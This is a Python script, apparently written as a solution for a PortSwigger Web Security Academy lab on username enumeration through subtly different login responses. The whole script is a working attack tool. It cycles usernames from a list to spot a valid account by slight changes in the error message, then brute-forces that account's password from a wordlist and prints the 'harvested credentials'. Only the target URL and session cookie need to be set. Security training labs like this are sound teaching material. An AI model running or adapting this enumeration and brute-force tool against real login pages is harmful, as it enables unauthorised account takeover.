# Semi-autonomous proof-of-concept script for Portswigger Lab: 
# "Username enumeration via subtly different responses"
# Only cookies and url must be entered in main() to work 
# (and this could be easily automated as well)

import requests
import sys

ERROR_CODE = 1
EXPECTED_LOGIN_MESSAGE = "Invalid username or password."

def read_into_list(file):
    list = []

    with open(file) as file_object:
        contents = file_object.readlines()
        for line in contents:
            list.append(line.strip())

    return list


def enumerate_valid_user(url, cookies, users, password_placeholder="peter"):

    for user in users:
        data = {
            "username": user,
            "password": password_placeholder,
        }
        
        try:
            response = requests.post(url, cookies=cookies, data=data)
        except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)

        if response.status_code != 200:
            print("[INFO ] An error occurred while enumerating the username")
            sys.exit(ERROR_CODE)
         
        login_message = response.text.split("warning>")[1].split("</p>")[0]

        if login_message != EXPECTED_LOGIN_MESSAGE:
            print(f"[INFO ] Enumerated valid user '{user}'!")
            return user


def bruteforce_password(url, cookies, user, passwords):
    for password in passwords:
        data = {
            "username": user,
            "password": password,
        }

        try:
            response = requests.post(url, cookies=cookies, data=data)
        except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)

        if "Invalid username" not in response.text:
            print(
                f"[INFO ] Enumerated password '{password}' for user '{user}'!"
            )  
            return password
        

def main():
    url = "" \
    "https://0a7b006904846d228057d5ee00330048.web-security-academy.net/login" \
    ""
    
    cookies = {
        "session": "AmxTb8V3HOwU95hNgOdqTO185ZDvmDwY",
    }
    
    users_file = "users.txt"
    passwords_file = "passwords.txt"

    users = read_into_list(users_file)
    passwords = read_into_list(passwords_file)

    print("[DEBUG] Attempting to enumerate a valid user")
    valid_user = enumerate_valid_user(url=url, cookies=cookies, users=users)

    print()

    print(
        f"[DEBUG] Attempting password bruteforce attack on user '{valid_user}'"
    )
    password = bruteforce_password(
        url=url, cookies=cookies, user=valid_user, passwords=passwords
    )

    print()

    login_credentials = f"User: '{valid_user}' \nPassword: '{password}'"
    print(f"[INFO] Harvested credentials: \n{login_credentials}")


if __name__ == "__main__":
    main()